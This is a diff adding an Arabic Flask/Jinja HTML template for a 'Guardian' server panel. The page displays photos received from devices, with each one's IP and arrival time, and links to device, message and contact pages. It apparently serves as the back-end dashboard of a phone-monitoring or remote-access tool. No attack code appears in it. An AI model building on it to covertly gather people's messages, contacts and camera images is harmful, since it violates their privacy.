@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Guardian — الصور</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0d0d0d;--surface:#1a1a2e;--cyan:#00e5ff;--purple:#7c4dff;--green:#00e676;--text:#ffffff;--text2:#b0bec5;--text3:#546e7a;--border:rgba(0,229,255,0.15);}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);direction:rtl;}
+  .sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:24px 0;z-index:100;display:flex;flex-direction:column;}
+  .logo{display:flex;align-items:center;gap:12px;padding:0 20px 24px;border-bottom:1px solid rgba(255,255,255,0.05);margin-bottom:16px;}
+  .logo-icon{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#00e5ff,#7c4dff);display:flex;align-items:center;justify-content:center;font-size:20px;}
+  .logo-text{font-size:16px;font-weight:700;} .logo-sub{font-size:10px;color:var(--cyan);letter-spacing:1px;}
+  .nav-item{display:flex;align-items:center;gap:12px;padding:12px 20px;text-decoration:none;color:var(--text2);font-size:14px;font-weight:500;transition:all 0.2s;border-right:3px solid transparent;}
+  .nav-item:hover,.nav-item.active{background:rgba(0,229,255,0.08);color:var(--cyan);border-right-color:var(--cyan);}
+  .nav-item .icon{font-size:18px;width:24px;text-align:center;}
+  .sidebar-footer{margin-top:auto;padding:16px 20px;border-top:1px solid rgba(255,255,255,0.05);}
+  .dot-live{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite;display:inline-block;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.4;}}
+  .main{margin-right:240px;padding:32px;}
+  .page-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;}
+  .page-title{font-size:24px;font-weight:700;} .page-sub{font-size:13px;color:var(--text2);margin-top:4px;}
+  .photos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px;}
+  .photo-card{background:var(--surface);border:1px solid var(--border);border-radius:16px;overflow:hidden;transition:transform 0.2s,border-color 0.2s;}
+  .photo-card:hover{transform:scale(1.02);border-color:var(--cyan);}
+  .photo-img{width:100%;height:180px;object-fit:cover;background:#0d0d0d;display:flex;align-items:center;justify-content:center;font-size:48px;}
+  .photo-img img{width:100%;height:180px;object-fit:cover;}
+  .photo-info{padding:12px;}
+  .photo-name{font-size:12px;font-weight:600;color:var(--text);margin-bottom:4px;word-break:break-all;}
+  .photo-meta{font-size:10px;color:var(--text3);}
+  .empty-state{padding:64px;text-align:center;color:var(--text3);}
+  .empty-icon{font-size:64px;margin-bottom:16px;}
+  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:999;align-items:center;justify-content:center;}
+  .modal.open{display:flex;}
+  .modal img{max-width:90vw;max-height:90vh;border-radius:12px;border:2px solid var(--cyan);}
+  .modal-close{position:absolute;top:20px;left:20px;background:var(--surface);border:none;color:var(--text);font-size:24px;cursor:pointer;width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;}
+</style>
+</head>
+<body>
+<nav class="sidebar">
+  <div class="logo">
+    <div class="logo-icon">🛡</div>
+    <div><div class="logo-text">Guardian</div><div class="logo-sub">SERVER PANEL</div></div>
+  </div>
+  <a href="/" class="nav-item">           <span class="icon">📊</span> Dashboard</a>
+  <a href="/devices" class="nav-item">    <span class="icon">📱</span> الأجهزة</a>
+  <a href="/messages" class="nav-item">   <span class="icon">💬</span> الرسائل</a>
+  <a href="/contacts_page" class="nav-item"><span class="icon">👥</span> جهات الاتصال</a>
+  <a href="/photos_page" class="nav-item active"><span class="icon">📷</span> الصور</a>
+  <div class="sidebar-footer"><div style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);"><span class="dot-live"></span>Server :5000</div></div>
+</nav>
+
+<main class="main">
+  <div class="page-header">
+    <div>
+      <div class="page-title">📷 الصور المستقبلة</div>
+      <div class="page-sub">{{ photos|length }} صورة</div>
+    </div>
+  </div>
+
+  {% if photos %}
+  <div class="photos-grid">
+    {% for p in photos %}
+    <div class="photo-card" onclick="openModal('/static/photos/{{ p.filename }}')">
+      <div class="photo-img">
+        <img src="/static/photos/{{ p.filename }}" alt="{{ p.filename }}"
+             onerror="this.parentElement.innerHTML='📷'">
+      </div>
+      <div class="photo-info">
+        <div class="photo-name">{{ p.filename }}</div>
+        <div class="photo-meta">🌐 {{ p.get('device_ip','') }}<br>🕐 {{ p.get('received_at','') }}</div>
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+  {% else %}
+  <div class="empty-state">
+    <div class="empty-icon">📷</div>
+    <div style="font-size:16px;font-weight:600;margin-bottom:8px;">لا توجد صور بعد</div>
+    <div>ستظهر هنا الصور المرسلة من الكاميرا</div>
+  </div>
+  {% endif %}
+</main>
+
+<!-- Modal عرض الصورة -->
+<div class="modal" id="modal" onclick="closeModal()">
+  <button class="modal-close" onclick="closeModal()">✕</button>
+  <img id="modalImg" src="" alt="">
+</div>
+
+<script>
+function openModal(src) {
+  document.getElementById('modalImg').src = src;
+  document.getElementById('modal').classList.add('open');
+}
+function closeModal() {
+  document.getElementById('modal').classList.remove('open');
+}
+</script>
+</body>
+</html>
